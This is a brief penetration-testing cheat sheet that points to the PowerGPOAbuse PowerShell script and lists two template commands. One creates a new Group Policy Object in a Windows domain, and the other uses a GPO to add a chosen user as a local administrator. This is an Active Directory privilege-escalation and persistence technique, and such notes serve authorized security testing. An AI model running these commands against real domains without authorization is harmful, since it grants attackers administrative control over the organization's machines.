### Source
https://raw.githubusercontent.com/rootSySdk/PowerGPOAbuse/master/PowerGPOAbuse.ps1  

### Create new gpo
```
New-DomainGPO -DisplayName &lt;gpoName&gt; -Domain &lt;domain&gt;
```

### Use gpo to add new admin
```
Add-LocalAdmin -GPOIdentity '&lt;gpo&gt;' -Member &lt;user&gt; -Domain &lt;domain&gt;
```


